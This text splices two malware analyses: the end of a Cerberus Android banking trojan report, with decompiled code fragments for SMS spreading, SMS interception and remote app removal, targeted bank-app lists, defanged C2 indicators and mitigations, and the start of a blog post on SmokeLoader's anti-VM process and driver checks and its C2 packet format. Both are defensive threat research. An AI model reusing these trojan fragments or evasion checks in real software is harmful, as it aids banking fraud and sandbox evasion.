+14. v4_2.f(p19, v4_2.a.X, v5_12); 
+15. return; 
+
+Figure 5.10.2 Java Code 
+
+ 
+
+After malware receives the command sms_mailing_phonebook from the C2, malware sends SMS to all contacts saved on the 
+device. 
+
+1. . 
+2. . 
+3. . 
+4. this._Utils._sendSMStoAllContacts((this, v6_83.getString(decryptedStr("t"))); 
+5. . 
+6. . 
+7. . 
+
+Figure 5.10.3 Java Code 
+
+ 
+
+After malware receives the command send_sms from C2, malware is capable of sending the SMS to relevant number. 
+
+1. . 
+2. . 
+3. . 
+4. this_Utils_SMSSender(p19, v6_83.getString(decryptedStr("n")), v6_83.getString(decryptedStr("t"))); 
+5. . 
+6. . 
+7. . 
+
+Figure 5.10.4 Java Code 
+
+ 
+
+If SMS permissions are OK, malware is capable of running the SMS data received. Sends the results back to C2 
+
+1. if (_intent.getAction().equals(this._strings._providerSMSRECEIVED)) { 
+2.    label117: { 
+3.      _Utils var5 = this._utils; 
+4.      Bundle _myBundle; 
+5.      boolean var10001; 
+6.      try { 
+7.         _myBundle = _intent.getExtras(); 
+8.      } catch (Exception var15) { 
+9.            var10001 = false; 
+10.            break label117; 
+11.      } 
+12.       if (_myBundle != null) { 
+13.           label114: { 
+14.              Object[] _pdus; 
+15.              try { 
+16.                 _pdus = (Object[])_myBundle.get("pdus"); 
+17.              } catch (Exception var14) { 
+18.                  var10001 = false; 
+19. . 
+20. . 
+21. . 
+
+Figure 5.10.5 Java Code 
+
+  
+
+Public  I  26 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+ Remote App Removal and Self Destruction 
+
+Cerberus can delete applications installed on the device, to do that malware opens the uninstall page for the application and 
+presses the uninstall button via using accessibility settings. C2 can issue two different commands to start this process: 
+“remove_bot” or “remove_app”. 
+ 
+
+• “remove_bot”: Automatically gets the current Cerberus package name and starts the uninstall procedure. 
+• “remove_app”: It starts the uninstall procedure for the application requested to be removed by the C2. 
+
+1. . 
+2. Intent _deleteIntent; 
+3. try { 
+4.    _deleteIntent = new Intent("android.intent.action.DELETE"); 
+5.    _deleteIntent.setData(Uri.parse("package:".concat(String.valueOf(_prefValue)))); 
+6.    this.startActivity(_deleteIntent); 
+7. } catch (Exception var101) { 
+8.    try { 
+9.       _deleteIntent = new Intent("android.intent.action.DELETE"); 
+10.       _deleteIntent.setData(Uri.parse("package:".concat(String.valueOf(_prefValue)))); 
+11.       _deleteIntent.addFlags(268435456); 
+12.       _deleteIntent.addFlags(8388608); 
+13.       this.startActivity(_deleteIntent); 
+14.    } catch (Exception var100) { 
+15.       var10001 = false; 
+16.    } 
+17. } 
+18. . 
+19. . 
+
+Figure 5.11.1 Java Code 
+
+  
+
+Public  I  27 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+ Mitigation and Countermeasures 
+Countermeasures; 
+
+• Users should be careful when opening content that promises to win money or any gifts.  
+• Installation of apps from third party sources should be disabled in Android settings. 
+• Anti-malware software (like Google Play Protect) should be installed, running and updated on devices. 
+• Before installing an application, authenticity of application should be checked. In case of doubt, the installation of the 
+
+application should not be continued. 
+• While installing an application, application should be treated as suspicious if it asks for accessibility permission while 
+
+installing, especially if it insists on obtaining this permission. 
+• Unnecessary permissions should not be given to applications during their use. Temporary permits must be withdrawn 
+
+after the work is done. 
+• The software of the devices should be kept up to date and changes that would adversely affect security measures 
+
+should not be made. 
+• In the case of mass managed devices, security measures should also be checked for the MDM server. 
+ 
+
+Countermeasures for Application Developers; 
+ 
+
+• Accessibility event filtering or sanitization 
+• Behavioral Listeners 
+• Window Punching 
+• In-App Keyboards 
+• Fingerprint API 
+• Use of Android's FLAG_SECURE where required 
+
+ 
+For more information, refer to: https://faui1-files.cs.fau.de/public/publications/a11y_final_version.pdf ( How Android’s UI Security 
+is Undermined by Accessibility ) 
+
+ 
+
+ 
+Mitigation; 
+
+• Make regular backups. This malware can delete the files on the system on command. 
+• Limit the impact of infection by disconnecting devices from internet or C2 servers, and rapidly start the removal process 
+
+of the malware. 
+• Reset any credentials including passwords. 
+• Before restoring from system backup, backup should be checked to be free from malware. 
+• To be ensure there isn't any infection remains; especially check accessibility permission or device admin enabled apps, 
+
+scan system with an anti-malware software and monitor network traffic. 
+  
+
+Public  I  28 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+ Future of Cerberus 
+On August 10 2020, Cerberus group officially announced the project is indeed dead because of Google Play Protects new 
+functionality. They published all the source code about Cerberus Project within the same announcement for the premium users of 
+the forum. 
+ 
+
+ 
+Figure 7.1 Post About Published Source Code, retrieved from xss[.]is 
+
+ 
+
+Why is the project dead? Well, they made it clear themselves. 
+
+Announcement from Cerberus developers about the project can be found in the Figure 7.1. 
+ 
+
+EN 
+Our bot died due to one problem, the Play Protect began to scan the resources of the APK file. 
+Initially, Cerberus was developed as a modular bot, with the loading of malicious code into resources, and at 
+that time the play-protec was not able to scan application resources. 
+At the moment, our module has signatures, and bots "die" when it is loaded. The solution is to remove the 
+module from the code and encrypt the entire APK, but then the size of the APK will be very large. 
+Solution number two: encrypt the module. 
+Why didn't we do it? 
+We had one module for all clients, and since the team was crumbling, it was not possible to find new 
+programmers who would make their own module for each client individually. 
+As a result, our clients could not encrypt the module for themselves. We encrypted the module 5 times, and 
+each crypt was fired the next day by signatures, and in the end our hands dropped, since this is not a 
+solution to the problem. 
+RU 
+У нас бот умер из за одной проблемы, плей протект стал сканировать ресурсы у АПК файла. 
+Изначально церберус разрабатывался как модульный бот, с подгрузкой вредоностного кода в 
+ресурсы, 
+и на тот момент плей протект не умел сканировать ресурсы приложения. 
+На текущий момент на нашем модуле стоят сигнатуры, и боты "умирают" при его загрузке. Решение - 
+убрать модуль из кода, и криптовать весь АПК, но тогда размер АПК будет очень большой. 
+Решение номер два: криптовать модуль. 
+Почему мы не стали это делать? 
+У нас был один модуль для всех клиентов, и так как команда рапалась, не получилось найти новых 
+программистов, которые бы сделали индивидуально под каждого клиента свой модуль. 
+В итоге у нас клиенты не могли криптовать модуль под себя. Мы криптовали модуль 5 раз, и каждый 
+крипт палился на следующий день по сигнатурам, и в итоге руки опустились, так как это не решение 
+проблемы. 
+
+Figure 7.1 Why Project is Dead? 
+
+ 
+
+Even after the release active campaigns from the same domains / groups are still active, which suggests old Cerberus clients are 
+still active with their old setup. 
+
+From now on Cerberus Source code is open to everyone in the wild. Which is a greater threat until the Android 11 release. We are 
+expecting self-crypted / frankenstein bots to be used in the wild and see code pieces of Cerberus in different Android Malware 
+samples. 
+
+  
+
+Public  I  29 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+ Sources  
+ 
+
+• https://xss.is/threads/29932/ ( malware - Cerberus Source Code | XSS.is (ex DaMaGeLaB) ) 
+• https://koodous.com/apks?search=tag:Cerberus ( Koodous ) 
+• https://en.wikipedia.org/wiki/ISO_3166-1_alpha-2 ( ISO 3166-1 alpha-2  -  Wikipedia ) 
+• https://www.ncsc.gov.uk/guidance/mitigating-malware-and-ransomware-attacks ( Mitigating malware and 
+
+ransomware attacks ) 
+• https://developer.android.com/guide/practices/verifying-apps-art ( Verifying app behavior on the Android runtime 
+
+(ART) ) 
+• https://github.com/androguard/androguard ( Androguard, Reverse engineering, Malware and goodware analysis of 
+
+Android applications ... and more (ninja !) ) 
+• https://faui1-files.cs.fau.de/public/publications/a11y_final_version.pdf ( How Android’s UI Security is Undermined by 
+
+Accessibility ) 
+ 
+ 
+  
+
+Public  I  30 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+ Appendix.A – Count of Detected Cerberus - Daily 
+
+500
+April 3, 2020 July 26, 2020 August 10, 2020
+
+Cerberus V2 Released Cerberus 
+450 Cerberus Source Code Released to 
+
+Source Code Offered for sale Premium Members
+
+400
+
+350
+
+300
+
+250
+
+200
+
+150
+
+100
+
+50
+
+0
+
+2020
+
+2.1.
+2.8.2020
+
+2.15.2020
+
+2.22.2020
+
+2.29.2020
+
+3.7.2020
+
+3.14.2020
+
+3.21.2020
+
+3.28.2020
+
+4.4.2020
+
+4.11.2020
+
+4.18.2020
+
+4.25.2020
+
+5.2.2020
+
+5.9.2020
+
+5.16.2020
+
+5.23.2020
+
+5.30.2020
+
+6.6.2020
+
+6.13.2020
+
+6.20.2020
+
+6.27.2020
+
+7.4.2020
+
+7.11.2020
+
+7.18.2020
+
+7.25.2020
+
+8.1.2020
+
+8.8.2020
+
+8.15.2020
+
+8.22.2020
+
+ 
+* Dataset taken from  https://koodous.com/  
+
+Public  I  31 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+ Appendix.B – Known Injection List 
+
+Spain United States Turkey Poland 
+ ar.com.santander.rio.mbanking  com.amazon.mShop.android.shopping  com.akbank.android.apps.akbank_direkt  com.empik.empikapp 
+ com.bancomer.mbanking  com.att.myWireless  com.albarakaapp  com.empik.empikfoto 
+ com.bankinter.launcher  com.chase.sig.android  com.finansbank.mobile.cepsube  com.finanteq.finance.ca 
+ com.bbva.bbvacontigo  com.clairmail.fth  com.garanti.cepsubesi  com.getingroup.mobilebanking 
+ com.bbva.netcash  com.discoverfinancial.mobile  com.ingbanktr.ingmobil  eu.eleader.mobilebanking.pekao.firm 
+ com.cajasur.android  com.google.android.gm  com.kuveytturk.mobil  eu.eleader.mobilebanking.pekao 
+ com.db.pbc.mibanco  com.infonow.bofa  com.magiclick.odeabank  pl.allegro 
+ com.kutxabank.android  com.instagram.android  com.mobillium.papara  pl.bzwbk.bzwbk24 
+ com.rsi  com.konylabs.capitalone  com.paribu.app  pl.bzwbk.ibiznes24 
+ com.tecnocom.cajalaboral  com.microsoft.office.outlook  com.pozitron.iscep  pl.ceneo 
+ es.bancosantander.apps  com.netflix.mediaclient  com.pttfinans  pl.com.rossmann.centauros 
+ es.bancosantander.empresas  com.paypal.android.p2pmobile  com.teb  pl.mbank 
+ es.caixagalicia.activamovil  com.snapchat.android  com.tmobtech.halkbank  pl.millennium.corpApp 
+ es.caixageral.caixageralapp  com.suntrust.mobilebanking  com.vakifbank.mobile  pl.orange.mojeorange 
+ es.cm.android  com.twitter.android  com.ykb.android  pl.pkobp.iko 
+ es.evobanco.bancamovil  com.usaa.mobile.android.usaa  com.ziraat.ziraatmobil  wit.android.bcpBankingApp.millenniumPL 
+ es.lacaixa.mobile.android.newwapicon  com.usbank.mobilebanking  finansbank.enpara 
+ es.liberbank.cajasturapp  com.wf.wellsfargomobile  tr.com.hsbc.hsbcturkey 
+ es.univia.unicajamovil  com.whatsapp  tr.com.sekerbilisim.mbank 
+ net.inverline.bancosabadell.officelocator.android  com.yahoo.mobile.client.android.mail 
+ org.stgeorge.bank 
+ www.ingdirect.nativeframe 
+
+Germany Italy Australia France 
+ com.db.mm.norisbank  com.CredemMobile  au.com.bankwest.mobile  com.boursorama.android.clients 
+ com.db.pwcc.dbmobile  com.db.pbc.miabanca  au.com.ingdirect.android  com.caisseepargne.android.mobilebanking 
+ com.starfinanz.smob.android.sfinanzstatus  com.latuabancaperandroid  au.com.nab.mobile  com.cic_prod.bad 
+ com.targo_prod.bad  com.lynxspa.bancopopolare  com.anz.android.gomoney  com.cm_prod.bad 
+ de.comdirect.android  com.unicredit  com.bankofqueensland.boq  com.fullsix.android.labanquepostale.accountaccess 
+ de.commerzbanking.mobil  it.bnl.apps.banking  com.bendigobank.mobile  com.IngDirectAndroid 
+ de.consorsbank  it.carige  com.commbank.netbank  fr.banquepopulaire.cyberplus 
+ de.dkb.portalapp  it.copergmps.rt.pf.android.sp.bmps  com.fusion.banking  fr.creditagricole.androidapp 
+ de.fiducia.smartphone.android.banking.vr  it.ingdirect.app  com.fusion.beyondbank  fr.lcl.android.customerarea 
+ de.ingdiba.bankingapp  it.nogood.container  com.greater.Greater  mobi.societegenerale.mobile.lappli 
+ de.postbank.finanzassistent  it.popso.SCRIGNOapp  org.banksa.bank  net.bnpparibas.mescomptes 
+ eu.unicreditgroup.hvbapptan  posteitaliane.posteapp.apppostepay 
+
+ 
+ 
+ 
+
+Public  I  32 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+United Kingdom India Japan Portugal 
+ com.barclays.android.barclaysmobilebanking  com.csam.icici.bank.imobile  cc.bitbank.bitbank  pt.bancobpi.mobile.fiabilizacao 
+ com.grppl.android.shell.CMBlloydsTSB73  com.mobikwik_new  com.gmowallet.mobilewallet  pt.novobanco.nbapp 
+ com.grppl.android.shell.halifax  com.oxigen.oxigenwallet  com.quoine.quoinex.light  pt.santandertotta.mobileparticulares 
+ com.grupocajamar.wefferent  com.sbi.SBIFreedomPlus  jp.coincheck.android  wit.android.bcpBankingApp.millennium 
+ com.htsu.hsbcpersonalbanking  com.snapwork.IDBI  jp.co.rakuten_bank.rakutenbank 
+ com.moneybookers.skrillpayments  org.bom.bank 
+ com.moneybookers.skrillpayments.neteller 
+ uk.co.santander.santanderUK 
+
+Canada Greece Austria Czech Republic 
+ com.bmo.mobile  com.EurobankEFG  at.volksbank.volksbankmobile  cz.csob.smartbanking 
+ com.cibc.android.mobi  com.mobileloft.alpha.droid  com.bankaustria.android.olb  eu.inmite.prj.kb.mobilbank 
+ com.rbc.mobile.android  mbanking.NBG 
+
+New Zealand Israel Luxembourg Malta 
+ com.anz.android.gomoney  com.ideomobile.hapoalim  piuk.blockchain.android  com.binance.dev 
+ nz.co.asb.asbmobile 
+
+Morocco Netherlands Peru Saudi Arabia 
+ ma.gbp.pocketbank  com.abnamro.nl.mobile.payments  pe.com.interbank.mobilebanking  com.samba.mb 
+
+  
+
+United Arab Emirates 
+ org.telegram.messenger 
+
+  
+
+Public  I  33 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+ Appendix.C – IoC Table 
+ 
+AppName MainActivity MINSDK EncryptedDEX SHA1Sum C2 Size(MB) 
+
+zkkhkrwuhuzyceyobartcprpp.tjxumszktyhbsrjbxb.bywitgzdnkqnuhbilfyyflycu.eaaym
+30GbKazan 20 OLJgc.json c66a0a2708d42dfb0ca3c7d07d02cefa12e98e40 hxxp[:]//mantiak[.]site 1.65 
+
+xscdywwuaf 
+
+5G_Turkcell hxdhpatrritcdgljiluiysg.ifacueugolkkhnf.yaqtduosjtcdjxofosal.jrnk 15 NpA.json 86473adb8072dec58d92bc98a0bca81f5900723e hxxp[:]//kryll[.]ug 1.42 
+
+Antivirus dbcokwappsdhrcmwixsbdonsb.wsfbr.cgoclqnxhzgznwutbeqeofauj.tiibvouayc 20 jJ.json 19b1922967d55909a08c920916af75b8c145b669 hxxp[:]//odry[.]press 1.66 
+
+okqyxdklzanoklhehwqdgiadsn.xndfwxtxaxxlsryatlobgszsiec.pdwkyskxcs.pahfqufyjim
+Bildirim 20 CH.json 302dea9d2ee1a97ad026d6c59191de6ccfdd153f hxxp[:]//olalalalalal[.]cyou 2.15 
+
+rcwen 
+
+Bildirim akqcp.mafu.mtwwyjhbsxj.ear 20 REG.json 84413bd33aa30bb45a8e8bd2a4c98a158619f160 hxxp[:]//konusuyonyapraam[.]cyou 1.94 
+
+C19 Online teoxasuzfloiqohgg.nhez.mjeikddql.gdhvxjovtdmr 20 iyOAXQ.json 21fb5ae2e813777c00699bab7f2e316838ea4c7a hxxp[:]//baykuratti[.]site 2.06 
+
+cevir kazan gyuhdfhwlqz.lbkzzysjbhwueqyszj.gkfnt.byuqixelqjd 20 sLk.json 4504b0f9db9867243bb074dc14fc9b330a3e1d73 hxxp[:]//malimaskim[.]xyz 2.22 
+
+Cevir kazan eakdgkwaur.jnpkxpethrjdyszfzbhobkdgegc.uwmrodcfue.hvgbogo 20 ASmk.json 6b31aaca8276cb95de2892cdd580172c701533aa hxxp[:]//malimaskim[.]xyz 1.87 
+
+infdgjzqhbmhahgzdgjgo.rruwdswakjxmkoxqyxppo.atriepziiolbnpswmmge.tctrsmjyc
+Covin-19 15 oMSELc.json f15c0c7b8773dbf6f29194780cd733c0b450ba6b hxxp[:]//indigojeans[.]top 1.69 
+
+cycdgds 
+
+eDestek dflfgplj.wczmsschglwnhytpszpccibuui.glglriwhjlwqlzlxi.gtrptaee 20 hByGgs.json 9624cc6439bac53bef2686311bc77d5ba29e07d2 hxxp[:]//sananekardesbanane[.]com 2.28 
+
+eDestek amnoroist.kiscoxoigdd.dijknkgjjeqcgyahkpaxfdyszcy.irnblujkvqhvu 20 pnC.json afb68420e017b4143327badd688a8f9069887219 hxxp[:]//isledimay[.]xyz 1.85 
+
+e-Devlet wwpthhuikjgedzwpfqxzmix.mtweihqmottdgam.ihpzmisckszkjwjyjuhp.lpsxirsnugntm 20 hLeQjGN.json 3f3ba34611a807a7b720e6f48ae86415886ff49d hxxp[:]//enayiusom[.]com 1.96 
+
+woaozffhounbhnkfkbidsxgm.ctdjszqkhyodhahhnoj.xemymqhrhrjwnjqeic.qednqxwn
+e-Devlet 20 ZZC.json a3e9bad4ea0941dd691c787d3a3b0189d01b013e hxxp[:]//redondibic05[.]site 1.74 
+
+ofysdwog 
+
+E-Devlet sksijoouenmdgadeyzafqbxkt.fubriza.qkpgswrrjmast.lncmhn 20 qxhycN.json d5b683b727276e9b9a09a3593b083f9b07baab4d hxxp[:]//evdekalmayaninanaskm[.]com 2.10 
+
+EvdeYasamVar exmi.afpih.kxdg.oymepudftnrw 20 EuwA.json 171c0c81696cbbe01488ed37b9da622232fe365d hxxp[://gesibaglarindadolaniyorumm[.top 2.08 
+
+Flash Player jfppnaidkjinhnnkhuglrbqpzu.nzlqfztusjkzfg.cfsmerwykthszegihtbqnlxcah.squiffpigkj 15 UpBdoj.json 6708aba84e9279a20cd6f7c8f60ca0f0c8d2a9ba hxxp[:]//ffesotoronuer[.]xyz 1.21 
+
+Google Play qybpsjxcehxgnog.srmynutfdldxykxesdimae.tlf.kbb 20 UFfHs.json 6af944f7583fe28e04c21a04967aa07e3e93c28c hxxp[:]//kusakel5[.]com 1.68 
+
+Google Play ksnsdetpaxmeuzhpddwcsmhaql.idarrwbkkr.wpigguns.zmhgppsstmlbmpf 20 lpKQCr.json 6fb5106f40933644d1728347ee80669a624fe176 hxxp[:]//kusakel7[.]com 1.79 
+
+Google Play xgkt.ncxzkbisryt.palbcxw.qlycainrja 20 qySTLI.json c4fbc3620c07e9d87f4dbfdce0d50a7a5434420f hxxp[:]//cacecarsa8[.]com 2.03 
+
+Google Play xqfeinytr.biphelgogahacfgdzxoorxfjewq.lqueypbnyejetokmohatd.pfozypq 20 Rns.json fc89225711386b4eeea196d8494fbce1b2b7a679 hxxp[:]//kusakel1[.]com 1.99 
+
+Google Update bokfsjnahepi.dkmasjexmnhcpwssrhhlz.zxwqn.wcnkj 20 mrC.json 57ed2fb24661cc995adb3d55cf0a8336f05b65c8 hxxp[:]//217[.]8[.]117[.]30 2.04 
+
+GTA V com.sakkkwyl.ncceberwpdhfq.iexuymsx 15 Not Encrypted 83424215154b1fae5976bf8a23341b6eb1f8f7f5 hxxp[:]//91[.]210[.]169[.]114/ 0.48 
+
+H.E.S(HayatEve
+emrymdyyusgmouugpieocs.mdbmliqxjgjzwosjpukp.fyktaec.ljd 20 TcPaEy.json 224f4bb18e9e0de42e1c9f926916f7c81762d6c0 hxxp[:]//onenightsten[.]one 1.96 
+
+Sigar) 
+
+Inpost sxegsbarhxycdammk.bfmramaqpwalppblj.pntpojdteozlllqrhplaquuxcb.jhlpwq 20 mKoUO.json 688e487b6a826d3cd7b3fbe220a74f699d3c3f8e hxxp[:]//inpostinfo[.]com 1.98 
+
+Inpost prlbtgul.cgjpknff.zxwjxmksxkcjrhcnex.ptfppzgoyiipmbr 20 PSqn.json 6d5b58dd87b6bbec736fc73fb02b4f82ef5c4874 hxxp[:]//inpostinfo[.]com 2.17 
+
+InPost_Paczko
+kssqpzibgxirrqcd.hjzkfqpxuslixaqpnyhizphb.yxx.nyecrckyc 20 jEjO.json 8e2e8f141004a472b436e445897a0bc41e509ee0 hxxp[:]//nfietreee3ffskc9ss[.]top 2.03 
+
+mat 
+
+InPost_Paczko
+gizguhyer.ufusmtcipoyqjwytbgf.ujwcqsjkpkixp.rpt 20 igULN.json fcf29a7df65ac03f380c458447ccb22f34872eb6 hxxp[:]//jglkgsnerivy3wksaczx[.]top 2.16 
+
+mat 
+
+InPost_Paczko
+oswylhacosqliuqj.sjqlldorqfhxpsnsjkzyqodenne.uiugonrzglhbbyhubkc.jveq 15 mpYSCtd.json 9d86e2fda388f4ade41f622dc1cd97988d02237d hxxp[:]//utyebwerr5f[.]top 2.24 
+
+maty 
+
+McAfeeSecurity dsyiftrrzbijzofgn.sjatmnksktqqghxtqeerrshyhu.wwphaceqtnpnqjpq.bivbvuiozdv 20 jRl.json 99abf018c96e00dad999309e1e6d910d248d43c0 hxxp[:]//bestuniquefest[.]pw 1.95 
+
+NETFLIX UHD ngfy.kprrhib.wzbmzhfoewkdxomdah.fnfwlryrmmvrklhs 15 HFG.json 2e21aa95435b3e0cfb406f1be5442790a96d5cb4 hxxp[:]//privateone[.]top 1.40 
+
+Sosyal Destek 
+dsowzmmtpdfuizncpq.lrsa.lrpgakqoswcadnhhhewoeckzdk.xxbtcgnudmv 20 ZWnaZ.json 55a330a6e878c25fb0668d77a68c645a4b5277f7 hxxp[:]//cemkeskin[.]xyz/ 1.66 
+
+30 GB 
+
+  
+
+Public  I  34 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+ 
+Most of the samples analysed during research had the following signature unless the sample originated from Google Play: 
+
+Signature: 
+ 
+Owner: EMAILADDRESS=android@android.com, CN=Android, OU=Android, O=Android, L=Mountain View, ST=California, C=US 
+Issuer: EMAILADDRESS=android@android.com, CN=Android, OU=Android, O=Android, L=Mountain View, ST=California, C=US 
+Serial number: 936eacbe07f201df 
+Valid from: Fri Feb 29 04:33:46 MSK 2008 until: Tue Jul 17 04:33:46 MSK 2035 
+Certificate fingerprints: 
+  SHA1: 61:ED:37:7E:85:D3:86:A8:DF:EE:6B:86:4B:D8:5B:0B:FA:A5:AF:81 
+  SHA256: A4:0D:A8:0A:59:D1:70:CA:A9:50:CF:15:C1:8C:45:4D:47:A3:9B:26:98:9D:8B:64:0E:CD:74:5B:A7:1B:F5:DC 
+Signature algorithm name: SHA1withRSA 
+Subject Public Key Algorithm: RSA (2048) 
+Version: 3 
+
+  
+
+Public  I  35 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+ Appendix.D Turkish Banks Injection Overlays 
+ 
+
+GARANTİ BANKASI İŞ BANKASI ZİRAAT BANKASI 
+
+   
+
+ 
+  
+
+Public  I  36 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+ 
+ 
+
+AKBANK YAPI KREDİ BANKASI ING BANK 
+
+   
+
+ 
+ 
+
+  
+
+Public  I  37 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+ 
+ 
+
+VAKIFBANK QNB FİNANSBANK TÜRKİYE EKONOMİ BANKASI 
+
+   
+
+ 
+ 
+
+  
+Public  I  38 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+ 
+ 
+
+ALBARAKA TÜRK KATILIM BANKASI HALBANK HSBC  
+
+   
+
+ 
+ 
+
+  
+
+Public  I  39 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+ 
+ 
+
+KUVEYTÜRK KATILIM BANKASI ENPARA ODEABANK 
+
+   
+
+ 
+ 
+
+  
+
+Public  I  40 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+ 
+ 
+
+PAPARA ŞEKERBANK PTT BANK 
+
+   
+
+ 
+ 
+
+  
+
+Public  I  41 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+ 
+ 
+
+PARİBU 
+
+ 
+
+ 
+ 
+ 
+
+Public  I  42 
+
+
+
+      
+ 
+ 
+ 
+ 
+ 
+
+ 
+
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ Biznet Bilişim Sistemleri ve Danışmanlık Sanayi Tic. A.Ş. 
+
+Ticari Sicil No: 159433 
+ 
+
+ SR Bilişim Yönetim Hiz. Tic. A.Ş 
+Ticari Sicil No: 703584 
+İSTANBUL ANKARA DUBAI LAHEY/ HOLLANDA
+
+ Nida Kule Plaza, ODTÜ Teknokent  İkizler SECURRENT ME FZ LLC Penet ra Cyber Securit y
+Kozyatağı Mah. Binası Üniversiteler Mah. 214, Build ing 12, DIC St raw inskylaan 411
+Değirmen Sok. No:18 İhsan Doğramacı Bulvarı 50 2318, UAE - Dubai 10 77XX Amsterdam
+Kat :19 34742 Kozyatağı, No:35 B Blok Kat :1 0 680 0 +9 971 4  390  16 46-49 The Netherlands
+Kadıköy, İstanbul Çankaya /  Ankara +31 (0 )70 -20 45180
++90  216 688 81 82 +90  312 210  11 77
+
+  
+ 
+
+
+
+Smokeloader Analysis and More Family Detections
+hatching.io/blog/tt-2020-08-27/
+
+2020-08-27
+
+triage
+
+Written by 
+Pete Cowm an
+In this week’s Triage Thursday blog, we’ll cover a number of minor updates to family
+classification introduced in the past week, and @Casperinous goes under-the-hood with
+recent changes observed in SmokeLoader samples.
+
+Over the past few days we have released another batch of smaller detection updates,
+affecting several families. The main focus has been on ransomware and stealers, adding
+family-specific detection for samples recently seen in the wild.
+
+1/9
+
+
+
+Read on below for more information on each of these topics.
+
+Not signed up yet? Head over to https://tria.ge/ and register right away!
+
+SmokeLoader Analysis
+Smokeloader is a downloader/backdoor which has been active since 2011. Over the years it
+has evolved both its capabilities and the variety of malware it downloads to the infected host.
+In this post we will have a look at what’s changed since the most recent analysis by
+Checkpoint and present the new features introduced in 2020.
+
+Smokeloader Analyses:
+
+200827-m1jren2nas
+200827-6x7fdlj8y2
+200827-v6tcrvw9es
+
+New Anti-VM methods
+
+Detection of unsigned drivers
+Smokeloader introduced 2 new anti-VM checks closely associated with the gaming
+community.
+
+The first one checks if the executable’s path contains the string [A-F0-9]{4}.vmt . Also, if
+the architecure of the system is 64-bit, NtQuerySystemInformation  is called with the first
+argument set to 0x67  ( SystemCodeIntegrityInformation ). After the call, ESI  points
+to the SYSTEM_CODEINTEGRITY_INFORMATION . The check [ESI+4]  confirms if the struct’s
+CodeIntegrityOptions  member is equal to 0x2 . Based on some public information it is
+
+assumed that this check is intended to detect the Driver Signing Policy of the infected host -
+if the value is indeed equal with 0x2  an unsigned kernel driver can be installed, a common
+configuration for sandboxes.
+
+The check is not well implemented - instead of comparing if the variable is equal with 0x2 ,
+it should be using a TEST  instruction to figure out if the 0x2  flag is used.
+
+2/9
+
+
+
+Detection of loaded DLLs
+Smokeloader also extended the list of loaded DLLs that it checks for. Going by previous
+analyses Smokeloader was only checking for sbiedll, but it was observed that in 2020 it is
+also looking for:
+
+aswhook
+snxhw
+
+Detection of processes associated with virtualization software
+Something that is common in various packers/loaders is checking the running processes
+against an array of predefined strings, in order to check virtualized environments.
+Smokeloader has implemented the same check, by calling NtQuerySystemInformation
+with the first parameter set to 0x5  ( SystemProcessInformation ) in order to get all the
+running processes. Then there is a loop where every process is converted to lowercase and
+is checked with wcsstr  to see if it contains the following strings:
+
+L"qemu-ga.exe”
+L"qga.exe”
+L"windanr.exe”
+L"vboxservice.exe”
+L"vboxtray.exe”
+L"vmtoolsd.exe”
+L"prl_tools.exe”
+
+3/9
+
+
+
+Detection of files associated with virtualization software
+Another technique employed by Smokeloader is checking the System32  folder for files that
+are associated with virtualization software. This is again done by calling
+NtQuerySystemInformation  with the first argument 0xB  ( SystemModuleInformation ).
+
+Then, following the previous logic, there is a loop where every file in the aforementioned
+location is converted to lowercase and checked by calling strstr  if it contains the following
+strings:
+
+“vmci.s”
+“vmusbm”
+“vmmous”
+“vm3dmp”
+“vmrawd”
+“vmmemc”
+“vboxgu”
+“vboxsf”
+“vboxmo”
+“vboxvi”
+“vboxdi”
+“vioser”
+
+After successfully passing the aforementioned checks, Smokeloader must determine the
+system’s architecture. This is done by using the gs  register and a test instruction. For our
+own convenience, we patched the check in order for Smokeloader to decompress the 32-bit
+payload and continue the analysis. While it was common for Smokeloader to utilize
+Propagate to inject the payload in explorer.exe , in the 2020 version it is still injecting into
+this process but it using a more typical combination of NtCreateSection,
+NtMapViewOfSection and RtlCreateUserThread to start the execution.
+
+4/9
+
+
+
+Changes in the payload
+
+Increased size of random data buffer
+Smokeloader introduced the usage of randomly generated data in 2019, possibly in order to
+fool IDS/IPS systems. The size of the buffer is calculated randomly but is set to be at most
+0x104 . Then, the number is used to allocate heap space and fill it with randomly generated
+
+lowercase letters. The generated string is appended at the end of the packet structure.
+
+Change in communication traffic
+As was discovered in early March, the communication packet structure of Smokeloader has
+been extended by 0x10  bytes. In the new struct, after the bot_id  member, there is a new
+field allocated to hold the name of the infected host. There is also now a check to either
+append the random data or the additional data at the end of the pkc  struct. The new struct
+is now defined like this:
+
+5/9
+
+
+
+struct pkc { 
+    WORD magic 
+    BYTE[40] bot_id 
+    BYTE[16] comp_name 
+    BYTE[6] botnet_id 
+    BYTE os_ver 
+    BYTE sec_flag_1 
+    BYTE sec_flag_2 
+    WORD comm_id 
+    DWORD task_idx 
+    DWORD tmp_path_run 
+    BYTE[n] extra_data 
+} 
+
+6/9
+
+
+
+In some cases SmokeLoader was observed to be using decoy C2 to put off analysts. In
+these instances the sample stored a fake value using its standard encryption technique
+which would be dumped by static extractors, and the actual C2 was simply stored as a
+plaintext string. Triage can now distinguish between the fake and real C2 strings and only
+reports the legitimate ones in the report. This analysis is a good example of this behaviour.
+
+7/9
+
+
+
+Ransomware Support
+Ransomware is extremely active these days and new variants and families are constantly
+being released, with even relatively basic ones sometimes managing to achieve infections in
+the wild. This week we’ve added support for a number of these which have gained attention
+over recent weeks.
+
+LockBit and BigLock Analysis:
+
+200827-dmry7lp4cs
+
+The sample referenced above came to our attention recently as a slightly unusual case. It
+drops multiple families, including 2 different ransomware - Lockbit and BigLock. Lockbit is run
+first, encrypting files with it’s distinctive .lockbit  extension, then another re-encrypts the
+files with a second layer.
+
